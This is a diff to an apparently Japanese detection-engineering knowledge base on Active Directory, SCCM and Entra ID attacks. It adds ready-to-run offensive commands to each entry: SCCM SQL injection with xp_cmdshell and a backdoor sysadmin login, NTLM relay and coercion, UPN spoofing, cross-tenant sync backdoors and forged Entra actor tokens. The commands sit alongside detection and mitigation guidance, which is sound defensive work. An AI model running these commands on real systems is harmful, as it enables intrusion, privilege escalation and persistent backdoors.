     "how": "前提条件は管理ポイントの HTTP サービスへのネットワーク到達性のみで認証は不要 (HTTPS-Only 構成の場合のみ、内部PKI発行のクライアント認証証明書で mTLS が必要。証明書が無くても Synacktiv PoC の --altauth スイッチで回避可)。攻撃者は MP の HTTP エンドポイント /ccm_system/request に CCM_POST メソッド・multipart/mixed ボディでクライアントメッセージを送信する。ボディは (1) Msg ルート要素を持つヘッダXML、(2) Zlib圧縮 Unicode の本体XML から成る。LocationMgr.dll (C:\\\\Program Files\\\\SMS_CCM\\\\) の CCM::MP::Location::CHandleLocationRequest::getMachineID が MP_GetMachineID ストアドを呼ぶ際、ヘッダの SourceID 要素をサニタイズせず連結するため注入が成立する (本体は UpdateSFRequest 型を使う必要あり)。第2の注入点は getContentID→MP_GetContentID で、既存デバイスの有効な SMS ID が必要。クエリは MP マシンアカウント (SMS サービス=サイトDBの sysadmin) として実行されるため、スタッククエリで xp_cmdshell を有効化し OS コマンド実行、あるいは CREATE LOGIN + sp_addsrvrolemember 'x','sysadmin' でバックドア管理者を作成できる。影響版は KB29166583 未適用の 2403 (<5.00.9128.1024)、2309 (<5.00.9122.1033)、2303 (<5.00.9106.1037)、および 2211 以前。修正版 KB29166583。",
     "tools": "Synacktiv PoC (CVE-2024-43468.py / unauth_sqli_LocationMgr.py), sqlcmd, xp_cmdshell, SharpSCCM, Impacket, カスタム CCM_POST クライアント",
+    "cmd": [
+      {
+        "tool": "CVE-2024-43468",
+        "t": "認証不要でMP_Locationへ注入しSQL実行を確認。`-sql`引数への任意クエリ注入自体がMP経由の異常なSQL実行として残る",
+        "q": "python3 CVE-2024-43468.py -t http://mp01.corp.local -sql \"SELECT @@version\""
+      },
+      {
+        "tool": "CVE-2024-43468",
+        "t": "注入したSQL内でxp_cmdshellを直接呼び出しRCEに至る。実行はサイトDBサーバのSMSサービスアカウント(sysadmin)権限で発生",
+        "q": "python3 CVE-2024-43468.py -t http://mp01.corp.local -sql \"EXEC master..xp_cmdshell 'whoami'\""
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "MPではなくサイトDBサーバの`sqlservr.exe`が`cmd.exe`を子プロセス生成する点が本CVE実行の痕跡。MP側にはプロセスログが残らない",
+        "q": "cmd.exe /c whoami"
+      },
+      {
+        "tool": "CVE-2024-43468",
+        "t": "HTTPS-Only構成でクライアント証明書が無い場合の認証回避オプション。`--altauth`指定自体が異常な接続経路の直接証拠",
+        "q": "python3 CVE-2024-43468.py -t https://mp01.corp.local -sql \"SELECT @@version\" --altauth"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "注入経由でサイトDBに永続的なsysadminログインを作成。通常運用にない`CREATE LOGIN`のスタックドクエリがSQLi特有の指紋",
+        "q": "CREATE LOGIN backdoor WITH PASSWORD='Passw0rd!'; EXEC sp_addsrvrolemember 'backdoor','sysadmin';"
+      }
+    ],
     "detect": "SQL注入ペイロード自体はログに反映されないため注入検知は困難。最も確実なのは後続挙動: (1) エンドポイント (MDE/CrowdStrike DeviceProcessEvents) で sqlservr.exe が cmd.exe/powershell.exe/certutil.exe 等を子プロセスとして生成 (xp_cmdshell RCE)。(2) 管理ポイントの IIS W3SVC ログで異常な CCM_POST /ccm_system/request リクエスト (異常な送信元・巨大/奇妙な SourceID)。(3) MP_Location.log に UpdateSFRequest メッセージ直後の getMachineID() 由来 80040401 エラー。(4) SQL Server 監査で xp_cmdshell の有効化 (sp_configure)、新規 sysadmin ログイン (CREATE LOGIN + sp_addsrvrolemember)。テレメトリ源: エンドポイントEDR (プロセス系譜)、IIS/W3SVC ログ、SCCM MP_Location.log、SQL Server 監査/エラーログ。オンプレ主体でクラウド監査ログは無関係。",
     "events": "4688(sqlservr.exe→cmd.exe/powershell.exe xp_cmdshell), IIS W3SVC ログ(CCM_POST /ccm_system/request 異常), MP_Location.log(UpdateSFRequest 直後 80040401 エラー), SQL Server 監査(xp_cmdshell 有効化 / 新規 sysadmin CREATE LOGIN+sp_addsrvrolemember)",
     "mitigate": "修正版 KB29166583 を全 SCCM サイトサーバ・管理ポイントに即時適用 (2403 は 5.00.9128.1024 以上を確認)。管理ポイントの HTTP/HTTPS を信頼できるクライアント境界のみに公開しインターネット到達を排除。SQL Server の xp_cmdshell を明示的に無効化し、SMS サービスアカウントに不要な sysadmin 権限を付与しない (最小権限化)。サイトDB に対する新規 sysadmin ログイン・sp_addsrvrolemember を監査で警告。EDR で sqlservr.exe の子プロセス生成を検知・ブロック。認証済み脆弱性スキャンで未パッチ MP を洗い出し、SQL DB に不正な新規 sysadmin アカウントが無いか監査する。",
@@ -9412,6 +15405,33 @@ AD.I18N.ja.attacks = [
     "summary": "SCCM/MECMのSMS Providerが公開するAdminService REST APIは、2509より前の既定構成でNTLM認証を受け付けるため、攻撃者が強制認証させたサイトサーバーのコンピューターアカウントを別のSMS ProviderのAdminServiceへリレーし、任意ユーザーをSCCM階層の「完全な管理者(Full Administrator)」に昇格できる階層乗っ取り手法。バージョン2509以降はAdminServiceがNTLMを拒否し封じられる(AdminService.logに「Rejecting NTLM authentication」)。CVEは割当なし(SFIによる設計強化で修正)。",
     "how": "前提: 有効なドメイン資格情報とネットワーク到達性のみ。SMS Providerが「リモート(サイトサーバーとは別ホスト)」に存在することが必須で、サイトサーバーは自分自身にはリレーできない。攻撃元DC/リレー先DCでNTLMが有効であることも条件。手順: (1)SCCMHunterでサイトサーバー/SMS Provider/AdminServiceのロールを列挙しリレー先を特定。(2)Garrett Foster版ntlmrelayxを起動: python3 ntlmrelayx.py --adminservice --logonname \"lab\\\\specter\" --displayname \"lab\\\\specter\" --objectsid <USER_SID> -smb2support -t https://<SMS_PROVIDER>/AdminService/wmi/SMS_Admin。(3)PetitPotam/CoercerでサイトサーバーへEFSRPC等の強制認証を発火: python3 PetitPotam.py -u lowpriv -p P@ssw0rd <RELAY_IP> <SITE_SERVER_IP>。強制されたサイトサーバーのマシンアカウント(既定でSMS Adminsグループ所属)のNTLMをHTTPS(443)のAdminServiceへリレーし、SMS_Admin/RBAC_Adminsへ攻撃者を完全な管理者として追加。強制対象はプライマリサイトサーバーまたはパッシブサイトサーバーのいずれも取り得る。影響バージョン: 2509より前(既定構成)。パッチ: 2509以降はAdminServiceがNTLMを拒否。EPA(Extended Protection for Authentication)はAdminServiceで未サポート。成功後は完全な管理者としてオンライン端末上でSYSTEM等として任意コード実行が可能。",
     "tools": "SCCMHunter, ntlmrelayx.py (Garrett Foster版impacketフォーク, --adminservice), PetitPotam, Coercer, impacket",
+    "cmd": [
+      {
+        "tool": "sccmhunter",
+        "t": "サイトサーバ/SMS Provider等のSCCMロールを列挙しリレー先を特定。階層乗っ取りの全手順に先行する偵察",
+        "q": "sccmhunter.py find -u svc_user -p 'Passw0rd!' -d corp.local -dc dc01.corp.local"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "強制認証させたサイトサーバのNTLMをAdminServiceへリレーしFull Administratorを追加。`--adminservice`は非公式フォーク限定の固有フラグ",
+        "q": "ntlmrelayx.py --adminservice --logonname \"corp\\attacker\" --displayname \"corp\\attacker\" --objectsid S-1-5-21-1111111111-2222222222-3333333333-1105 -smb2support -t https://sms-provider.corp.local/AdminService/wmi/SMS_Admin"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "EFSRPCでサイトサーバに攻撃者リスナーへの認証を強制。2509未満の既定構成でAdminServiceがNTLMを受理する前提を突く",
+        "q": "python3 PetitPotam.py -pipe efsr 10.0.0.5 sccm-sitesrv.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "PetitPotamより多くのRPCプロトコルで強制認証を試行する代替ツール。`--listener-ip`宛の認証発生がサイトサーバ側の手掛かり",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' --target sccm-sitesrv.corp.local --listener-ip 10.0.0.5"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "新規付与されたFull Administrator権限でNAA資格情報を回収する事後活動。直前のリレー活動との相関が検知の鍵",
+        "q": "SharpSCCM.exe get secrets"
+      }
+    ],
     "detect": "エンドポイント(MDE/CrowdStrike): 強制認証・リレー実行元ホストでのpython/ntlmrelayx/PetitPotam/Coercerプロセスと、リレー元→サイトサーバーへのSMB(445)、および攻撃ホスト→SMS ProviderへのHTTPS(443)のAdminService(/AdminService/wmi/SMS_Admin)アクセス。ID(MDI): サイトサーバーのコンピューターアカウント($)が想定外の発信元からNTLMで認証している異常(IdentityLogonEvents Protocol=Ntlm)。ドメインコントローラーの4776でサイトサーバーのマシンアカウントのNTLM検証(Source Workstation=リレー元/SMS Provider)。SMS Providerホストの4624 LogonType3/NTLM(アカウント=サイトサーバー$)。SCCM側テレメトリ: SMS ProviderのSMSProv.log、RBAC_Admins/SMS_Adminテーブルへの完全な管理者追加、hman.log/管理者監査。2509適用後はAdminService.logの「Rejecting NTLM authentication」でリレー試行を検知可能。",
     "events": "4624(LogonType3/NTLM, サイトサーバーのコンピューター$アカウント), 4776(DCでのNTLM検証, Source=リレー元/SMS Provider), MDI NTLM ログオン(IdentityLogonEvents Protocol=Ntlm), SCCM SMSProv.log / RBAC_Admins・SMS_Adminへの完全な管理者追加, 4688(ntlmrelayx/PetitPotam/python)",
     "mitigate": "(1)恒久対策: Configuration Manager 2509以降へ更新——AdminServiceがNTLM認証を拒否し本経路を封じる。(2)ドメインでNTLMを制限(RestrictNTLMInDomain/RestrictSendingNTLMTraffic、またはサイトシステムへのNTLM無効化)し、Kerberos強制。(3)強制認証の緩和: 不要なMS-EFSRPC/MS-RPRN等をブロックし、サイトシステム間の445/443を必要最小限にセグメント化。(4)SMS Providerを多重化/リモート配置している場合のリレー面を縮小、サイトサーバーのマシンアカウントを不要ロールから除外。(5)完全な管理者ロールの追加(SMS Admins/RBAC_Admins)をアラート化し継続監視。(注)EPAはAdminServiceで未サポートのため単独の緩和にはならない。",
@@ -9457,6 +15477,33 @@ AD.I18N.ja.attacks = [
     "summary": "SCCM の AdminService(OData REST API)が Entra 統合(CMG/共同管理)で受け取ったアクセストークンの UPN クレームを認可検証なしに信頼し、Kerberos S4U で任意の AD ID になりすます認証バイパス(CWE-290)。攻撃者がサイトサーバーのマシンアカウント暗黙UPNになりすまして階層全体の Full Administrator に昇格できる。CVSS 3.1 4.8(Medium、AV:A/AC:H/PR:L/S:U/C:H)。2025年10月の KB35360093(2403/2409/2503 各ブランチのセキュリティ更新)で onprem_sid クレーム検証が追加され修正済み。CISA KEV 未掲載で実環境での悪用報告なし。",
     "how": "前提: SCCM の Entra 統合(Azure Services ウィザードで登録される \"clientapp\"/\"webapp\")が CMG または共同管理で有効、検証済みルーティング可能ドメインが Entra に存在、ビーチヘッドが管理対象 SCCM クライアント、攻撃者が同期対象 OU にユーザー作成権限と対象の UPN 変更権(GenericWrite/WriteProperty/GenericAll)を保有。手順: (1) サイトサーバーのマシンアカウント暗黙UPN(例 sccm-sitesrv$@corp.com、マシンアカウントは既定で UPN 未設定のため衝突しない)に一致する明示 UPN を持つ AD ユーザーを作成、(2) Azure AD Connect の次回同期で当該アカウントがそのUPNのまま Entra に同期される、(3) clientapp で認証し webapp スコープのアクセストークンを取得(クレームにサイトサーバーUPNが載る)、(4) 攻撃者ユーザーの UPN を元の値に戻す(明示UPNマッピングが最初に評価されるため暗黙UPNフォールバックに解決させる)、(5) トークンを AdminService に提示すると WindowsIdentity(UPN) 構築時に S4U ログオンが走りサイトサーバーマシンアカウントとしてなりすまし、(6) 自分の AD アカウントを Full Administrator として追加し全管理クライアントに RCE。ツールは garrettfoster13 の poc.py(token/admin モジュール、uv 管理)。影響: Configuration Manager 2403(<5.00.9128.1037)/2409(<5.00.9132.1031)/2503(<5.0.9135.1013)の Entra 統合有効環境。修正 KB35360093(2025-10-27、2403/2409/2503 各ブランチ)がトークンの onprem_sid クレームを発見済み SCCM ユーザーの SID と突合。CVSS 3.1 4.8(Medium)。",
     "tools": "garrettfoster13/CVE-2025-59501 poc.py(token/admin モジュール、uv), Misconfiguration Manager (ELEVATE/CRED tradecraft), SharpSCCM, BloodHound CE, Azure AD Connect(悪用される同期基盤), PowerShell/AD ツール(UPN 変更)",
+    "cmd": [
+      {
+        "tool": "CVE-2025-59501",
+        "t": "Entra統合済みclientapp宛のアクセストークンを対話認証で取得。`poc.py token`実行はSCCM管理端末では通常発生しない",
+        "q": "uv run poc.py token -u -c a1b2c3d4-5678-90ab-cdef-1234567890ab -t contoso.onmicrosoft.com"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "サイトサーバのマシンアカウント暗黙UPNと衝突する明示UPNでADユーザーを新規作成。`$`を含むUPN作成は通常運用にまず無い",
+        "q": "New-ADUser -Name attacker -UserPrincipalName 'sccm-sitesrv$@corp.com' -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Enabled $true"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同期後に明示UPNを元へ戻し暗黙UPNフォールバックへ解決させる工程。短時間でのUPN往復変更が本手法特有のADログパターン",
+        "q": "Set-ADUser -Identity attacker -UserPrincipalName attacker@corp.com"
+      },
+      {
+        "tool": "CVE-2025-59501",
+        "t": "取得トークンをAdminServiceへ提示しS4UでサイトサーバへなりすましFull Administratorへ追加。`poc.py admin`実行が接続元の異常点",
+        "q": "uv run poc.py admin -t https://sms-provider.corp.local -u attacker@corp.com -s S-1-5-21-1111111111-2222222222-3333333333-1234 -a eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "昇格後のFull Administrator権限でNAA資格情報を回収する事後活動。本CVE単体はCISA KEV未登録のため他シグナルとの相関が要",
+        "q": "SharpSCCM.exe get secrets"
+      }
+    ],
     "detect": "ID/クラウド監視が主軸。(1) Entra サインイン(EntraIdSignInEvents/SigninLogs): マシンアカウント形状の UPN(末尾 \"$@\")が SCCM webapp(AdminService)リソースへトークンサインイン — 正規ユーザーは $ を含まない明確な異常。(2) オンプレ AD セキュリティログ(4720 作成 / 4738 変更、精密には 5136 ディレクトリ属性変更): ユーザーオブジェクトの userPrincipalName が machine$@domain 形状に設定→短時間で元値に戻る往復。(3) Entra ディレクトリ監査(AuditLogs: Add user / Update user, InitiatedBy=AAD Connect 同期): UPN が $ を含む値へ更新。(4) サイトサーバー: S4U ログオン(4624 LogonType3)とサイトサーバーマシンアカウントによる SMS Admin 追加。(5) SMS Provider の SMSAdminService.log でトークン認証後の管理者追加。テレメトリ源: Entra サインイン/監査ログ、オンプレ DC セキュリティイベント、MDI、SCCM AdminService ログ。",
     "events": "4720/4738(ユーザー作成・UPN変更→復元、精密には5136), EntraIdSignInEvents/SigninLogs(SCCM webapp/AdminService へ machine$@ UPN サインイン), Entra AuditLogs(Update user: UPN に $), 4624 LogonType3 S4U(サイトサーバー), SMSAdminService.log(管理者追加)",
     "mitigate": "(1) 修正更新 KB35360093(2403/2409/2503 各ブランチ、2025-10)を適用 — トークンの onprem_sid を発見済み SCCM ユーザーの SID と突合し UPN なりすましを遮断。(2) 特権 SCCM 管理者アカウントを Entra に同期しない(MS 推奨)。(3) 同期対象 OU での UPN 変更権(GenericWrite/WriteProperty/GenericAll)を最小化・棚卸し、マシンアカウント形状 UPN の付与を監査/防止。(4) Entra 条件付きアクセスで SCCM webapp への対話サインインを準拠デバイス/信頼できる場所に限定し、リスクサインインをブロック。(5) AdminService への Entra トークン認証と UPN 変更に対する検知アラートを常設。(6) CMG/共同管理が不要ならレガシー Entra 統合を無効化し攻撃面を縮小。",
@@ -9502,6 +15549,33 @@ AD.I18N.ja.attacks = [
     "summary": "MS-EVEN(ElfrOpenBELW=CheeseOunce, \\PIPE\\even, opnum9)・MS-PAR(RpcAsyncOpenPrinter, \\PIPE\\spoolss)・MS-WSP(Windows Search, \\pipe\\MsFteWds)などの正規RPC関数のUNC/ファイル名パラメータを悪用し、低権限ドメインアカウントで標的WindowsにマシンアカウントのSMB認証を強制させ、NTLM(必要に応じHTTPへクロスリレー)/Kerberosリレーへ繋ぐ強制認証(coercion)手法群。CVE不在の仕様悪用のため恒久パッチが無く、RPCフィルタ/SMB・LDAP署名/EPAで緩和する。",
     "how": "前提: 標的へネットワーク到達可能な認証済み低権限ドメインユーザーまたはマシンアカウントのみ(管理者不要)。攻撃者はリレーサーバ(ntlmrelayx等)を起動し、Coercer/CheeseOunce/WSPCoerce/SharpCoercerで対象RPCを叩く。プリミティブ: (1)MS-EVEN=EventLog Remoting、\\PIPE\\even 上でElfrOpenBELW(opnum9)のBackupFileNameに \\\\攻撃者IP\\share を渡し標的をSMBで認証させる(CheeseOunce)。「リモートイベントログ管理」FW例外が開いていると成立。(2)MS-PAR=印刷非同期プロトコル、\\PIPE\\spoolss へバインド(UUID 76f03f96-cdfd-44fc-a22c-64950a001209)しRpcAsyncOpenPrinter(opnum0)/RpcAsyncRemoteFindFirstPrinterChangeNotificationEx(Spooler稼働時、PrinterBug系)。(3)MS-WSP=Windows Search、\\pipe\\MsFteWds 経由で認証を誘発(WSPはSMBのみ強制可、既定でワークステーションのみ有効、Server 2016以降サーバは無効)。強制したマシンアカウントのSMB NTLMをAD CS(ESC8、SMB→HTTPクロスリレー)・LDAP・SMBへリレーし証明書発行/RBCD/権限奪取に連鎖。CVEは無く仕様上の機能でありパッチ不在、影響は該当サービスが露出する全Windows。",
     "tools": "Coercer, CheeseOunce, WSPCoerce/wspcoerce, SharpCoercer, PetitPotam(比較), Impacket ntlmrelayx.py, Certipy, krbrelayx",
+    "cmd": [
+      {
+        "tool": "Coercer",
+        "t": "CheeseOunce(MS-EVEN::ElfrOpenBELW)のみに絞って強制認証、`--filter-method-name`の値がコマンドラインに残る",
+        "q": "Coercer.py coerce --filter-method-name ElfrOpenBELW -u svc_user -p 'Passw0rd!' -d corp.local -t dc01.corp.local -l 10.0.0.5"
+      },
+      {
+        "tool": "WSPCoerce",
+        "t": "MS-WSP(MsFteWdsパイプ)経由でSMB認証のみを強制、第1引数=標的ホスト・第2引数=リスナーIPの並びが固有",
+        "q": "WSPCoerce.exe dc01 10.0.0.5"
+      },
+      {
+        "tool": "wspcoerce",
+        "t": "Go実装のクロスプラットフォーム版、`file:////`のUNC相当パスがリスナー指定としてコマンドラインに残る",
+        "q": "wspcoerce 'corp.local/svc_user:Passw0rd!@10.0.0.20' \"file:////10.0.0.5/share\""
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "比較対象のMS-EFSR強制認証、RPCフィルタやポート445遮断だけではCheeseOunce/WSP系と合わせて防ぎきれない",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Impacket",
+        "t": "MS-PAR(interface 76f03f96-cdfd-44fc-a22c-64950a001209)含む公開RPCインターフェースの事前列挙",
+        "q": "rpcdump.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local"
+      }
+    ],
     "detect": "エンドポイント(MDE): DeviceEvents の NamedPipeEvent で \\pipe\\even / \\pipe\\spoolss / \\pipe\\MsFteWds への着信、直後の DeviceNetworkEvents 445アウトバウンド(標的→非DC/未知ホスト)。プロセス: python/impacket/Coercer/CheeseOunce のコマンドライン(攻撃ホスト側)。ID(MDI): IdentityLogonEvents で該当マシンアカウント$のNTLMログオンがリレー先へ短時間に発生。Windowsセキュリティ監査: 5145(共有IPC$への相対名 even/spoolss/MsFteWds)、リレー先での4624/4625 LogonType3・マシンアカウント。RPCフィルタ/RPC Firewall監査でElfrOpenBELW/RpcAsyncOpenPrinter拒否ログ。テレメトリ源: MDE(プロセス/ネットワーク/名前付きパイプ)、Windows Security 5145/4624、MDI IdentityLogonEvents。",
     "events": "MDE DeviceEvents NamedPipeEvent(\\pipe\\even, \\pipe\\spoolss, \\pipe\\MsFteWds), 5145(共有IPC$相対名 even|spoolss|MsFteWds), 4624(LogonType3 マシンアカウント$ リレー先), 4625(認証失敗), RPC Firewall Audit(ElfrOpenBELW/RpcAsyncOpenPrinter deny)",
     "mitigate": "CVE不在のため個別パッチは無く構成で緩和する。(1)不要サービス/露出を停止: DCでリモートイベントログ(EventLog)到達を遮断、Print Spooler無効化、Windows Search無効化。(2)ホストFWで「リモートイベントログ管理」「ファイルとプリンターの共有」例外を閉じ、RPC(135/49152+)と445を管理端末に限定。(3)RPCフィルタ(netsh rpc filter)またはRPC Firewallで MS-EVEN(82273fdc-...)/MS-PAR(76f03f96-...)/MS-WSP のインターフェースを認証済み管理者以外拒否。(4)リレー対策: SMB署名必須、LDAP/LDAPS署名+チャネルバインディング、AD CS Web登録でEPA有効化・HTTP無効化(ESC8封じ)、NTLM段階的無効化。(5)Tier分離とマシンアカウントの横展開監視。",
@@ -9547,6 +15621,28 @@ AD.I18N.ja.attacks = [
     "summary": "Entra IDのクロステナント同期(CTS)機能を悪用し、Global Admin/Security Administrator/Hybrid Identity Administrator権限を得た攻撃者が既存のアウトバウンド同期スコープに自アカウントを追加して連携先テナントへ横展開、または不正なインバウンド同期パートナー(ローグCTS)を構成して攻撃者テナントからユーザーを継続注入するバックドアを作る手法。CVEではなく設定悪用で、両テナントにEntra ID P1/P2が必要。",
     "how": "前提: 侵害テナントでGlobal Administrator、Security Administrator、またはCTS構成変更が可能なHybrid Identity Administrator、あるいは粒度権限 microsoft.directory/crossTenantAccessPolicy/partners/create と .../partners/identitySynchronization/basic/update。既存CTSスコープへのユーザー追加はCloud/Application Administratorでも可。両テナントにEntra ID Premium P1/P2が必須。横展開: (1) 既存のクロステナントアクセス(CTA)ポリシーを列挙しユーザー同期(inbound/outbound)有効の連携先を特定、(2) 同期用プロビジョニングジョブ/サービスプリンシパルのスコープに侵害ユーザーを追加、(3) プッシュ同期でそのアカウントが連携先へB2Bで出現し同一資格情報で横移動。持続化(ローグCTS): 攻撃者テナントをインバウンド同期パートナーとして構成し、以後任意のタイミングで攻撃者ユーザーを被害テナントへ注入。ツールはMicrosoft Graph PowerShell、Az/Azure CLI、AzureHound、Entra管理ポータル。関連する実行例としてStorm-0501はEntra ConnectのDirectory Synchronization Account資格情報を窃取しGraphで同期ID・パスワードを操作、AADInternalsで悪性フェデレーションドメインを追加しSAMLトークン偽造でバックドア化した(CTSそのものではないが同種のテナント間信頼/同期悪用)。パッチではなく設定・条件付きアクセス・監査で緩和する性質。",
     "tools": "Microsoft Graph PowerShell (Microsoft.Graph), Az PowerShell / Azure CLI, AzureHound, Entra 管理センター, AADInternals (関連: Storm-0501 のフェデレーション/同期アカウント悪用)",
+    "cmd": [
+      {
+        "tool": "Graph API",
+        "t": "既存アウトバウンド同期スコープに侵害アカウントを追加し連携先テナントへ横展開。監査ログのcrossTenantAccessPolicy更新操作として残る",
+        "q": "Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerId <partner-tenant-id> -B2BCollaborationOutbound @{UsersAndGroups=@{AccessType='allowed';Targets=@(@{Target='<attacker-user-id>';TargetType='user'})}}"
+      },
+      {
+        "tool": "Graph API",
+        "t": "攻撃者テナントを新規インバウンド同期パートナーとして登録し継続的なユーザー注入バックドアを作る。新規パートナー作成自体が強いシグナル",
+        "q": "New-MgPolicyCrossTenantAccessPolicyPartner -TenantId <attacker-tenant-id> -IdentitySynchronization @{UserSyncInbound=@{IsSyncAllowed=$true}}"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "PowerShellモジュール無しでGraphを直接PATCH。az restは署名済み正規バイナリのため実行ファイル単体の検知をすり抜ける",
+        "q": "az rest --method patch --url \"https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners/<tenantId>\" --body '{\"identitySynchronization\":{\"userSyncInbound\":{\"isSyncAllowed\":true}}}'"
+      },
+      {
+        "tool": "Graph API",
+        "t": "悪用前の偵察。既存パートナーのuserSyncInbound/B2B設定を列挙し横展開可能なスコープの穴を探す",
+        "q": "Get-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerId <tenantId>"
+      }
+    ],
     "detect": "テレメトリはEntra監査ログ(AuditLogs)とサインインログ(SigninLogs)が中核で、CRS/CTS関連は監査ログにのみ記録される。検知シグナル: (1) クロステナントアクセス設定パートナーの追加/更新(「Add a partner to cross-tenant access setting」)、(2) クロステナント同期(identitySynchronization)構成・プロビジョニングジョブの作成/有効化、(3) 同期用サービスプリンシパルへのアプリロール割り当てやスコープ変更、(4) 外部ユーザー招待/引き換えの急増、(5) 新規B2B(クロステナント)サインインが未知のリソーステナントや異常な地理から発生。被害(ターゲット)側では同期処理がアクター「Microsoft.Azure.SyncFabric」として記録される点も手掛かり。エンドポイント側はEntra ConnectサーバでのMicrosoft Graph/PowerShell実行、同期アカウント資格情報アクセス(Storm-0501系)を監視。MDIのIdentityDirectoryEventsやCloudAppEvents(Entra/AzureAD活動)で相関。",
     "events": "Entra AuditLogs(Add a partner to cross-tenant access setting / Update a partner cross-tenant access setting / Add cross-tenant identity synchronization policy / Add app role assignment to service principal / Invite external user / Redeem external user invite; target-side sync actor = Microsoft.Azure.SyncFabric), SigninLogs & EntraIdSignInEvents(B2B cross-tenant sign-in), CloudAppEvents(Entra/AzureAD), 4688/4624(Entra Connect server)",
     "mitigate": "恒久的なパッチは存在しない設定悪用のため、構成統制で緩和: (1) クロステナントアクセスポリシーとCTS構成を棚卸しし、不要なアウトバウンド/インバウンド同期を無効化、既定でインバウンド同期をブロック、(2) 信頼するパートナーを許可リスト化し未承認テナントからの同期を拒否、(3) Global Administrator/Security Administrator/Hybrid Identity Administrator と crossTenantAccessPolicy 系権限を最小化しPIM/JITで昇格管理、(4) 特権ロールにフィッシング耐性MFA+条件付きアクセスを強制、(5) 監査ログでパートナー/同期設定変更をアラート化、(6) Entra Connect同期アカウント資格情報を保護(サーバ隔離、Directory Synchronization Accountのロール見直し、Entra Connect 2.5.3.0以降でアプリケーションベース認証採用、レガシー認証遮断)、(7) 未知テナントからのB2Bサインインを条件付きアクセスで制限。",
@@ -9592,6 +15688,28 @@ AD.I18N.ja.attacks = [
     "summary": "Entraの内部サービス用「Actorトークン」を悪意テナントで取得し、レガシーAzure AD Graph（graph.windows.net）がトークン内テナントIDを検証しない欠陥を突いて、任意テナントの任意ユーザ（Global Admin含む）へなりすませたクロステナント権限昇格（CVSS 10.0）。Microsoftは2025-07-17に全世界サーバ側で修正済みで顧客側対応は不要だが、悪用時はMFA/条件付きアクセス/サインインログを回避する点が致命的。",
     "how": "前提: 攻撃者は任意の（自分で作った）テナントの管理権限のみ。手順: (1) 自テナントのAccess Control Service(ACS)から、サービス間委任用の署名済みActorトークン（trustedfordelegation=true、RS256署名、有効期限24h、aud=Azure AD Graph+標的テナントGUID）を要求。(2) そのActorトークンを内包する「未署名(alg:none)の偽装(impersonation)トークン」を生成し、nameidを標的ユーザのnetId(=puidクレーム、連番)で指定。netIdは連番のため総当り可能か、ゲスト属性・B2B招待・漏えいトークンから取得。(3) このトークンでレガシーAzure AD Graph(graph.windows.net)へアクセスすると、テナントID不整合を検証しないためGlobal Adminを含む任意ユーザとしてディレクトリ全体を読み書き可能。キープリミティブ=「未署名トークン内tenantId＋netIdのなりすまし」。ツールはdirkjanmのroadtx/roadreconでトークン生成とテナント列挙。影響=全Entra IDテナント（国家クラウド除く）。修正: 2025-07-17にMSがサーバ側緩和、08-06に該当API向けActorトークン発行を追加ブロック、CVEは09-04付与。Azure AD Graphは廃止進行中。",
     "tools": "roadtx, roadrecon (dirkjanm/ROADtools), Azure AD Graph API (graph.windows.net), 自作Actorトークン取得スクリプト",
+    "cmd": [
+      {
+        "tool": "roadtx",
+        "t": "自テナントのACSから委任用Actorトークンを要求。`actortoken`サブコマンド自体がこの手法固有の指紋",
+        "q": "roadtx actortoken -t <target-tenant-id> -c 00000002-0000-0ff1-ce00-000000000000 -r 00000002-0000-0ff1-ce00-000000000000/outlook.office.com --cert-pfx attacker-app.pfx --pfx-pass 'Passw0rd!'"
+      },
+      {
+        "tool": "roadtx",
+        "t": "Actorトークンを内包する未署名なりすましトークンをnetId指定で生成。標的テナントのGlobal Adminをそのまま騙れる",
+        "q": "roadtx impersonationtoken -u admin@victimtenant.onmicrosoft.com -n <netId-or-puid> -t <target-tenant-id>"
+      },
+      {
+        "tool": "roadtx",
+        "t": "偽装トークンで廃止予定のレガシーAzure AD Graph(graph.windows.net)へアクセス。2025-07-17のサーバ側修正前はテナントID不整合を検証していなかった",
+        "q": "roadtx graphrequest -m GET \"https://graph.windows.net/<target-tenant-id>/users?api-version=1.6\""
+      },
+      {
+        "tool": "roadrecon",
+        "t": "偽造トークンで標的テナント全体をSQLiteへ吸い出す。標的組織のIPレンジ外からgraph.windows.netへの認証済み大量GETが指紋",
+        "q": "roadrecon auth --access-token <forged-token> && roadrecon gather"
+      }
+    ],
     "detect": "重要: トークンの発行・使用・照会(read)はサインインログにも監査ログにも一切残らない=なりすまし自体はほぼ検知不能。検知は攻撃者の「変更(write)後アクション」に依存する。テレメトリはEntraディレクトリ監査ログ(AuditLogs)のみ。異常シグナル: (1) 特権ロール付与・サービスプリンシパルへの資格情報/証明書追加・条件付きアクセス変更・アプリ所有者追加などの特権変更が、対応するサインインログ(SigninLogs/EntraIdSignInEvents)無しに発生する(サインイン無しの特権変更＝最重要指標)。(2) 監査ログのInitiatedByで、なりすまされたGlobal AdminのユーザUPNが記録されているのにアプリ表示名が「Office 365 Exchange Online」等のMicrosoftファースト系サービスとして出る不整合(dirkjanm確認済みの決定的アーティファクト)。(3) roadtx/roadrecon等の攻撃者ホスト側プロセス(python + graph.windows.net宛通信)。オンプレ同期があれば変更が4720/4728等でDCに波及することもある。",
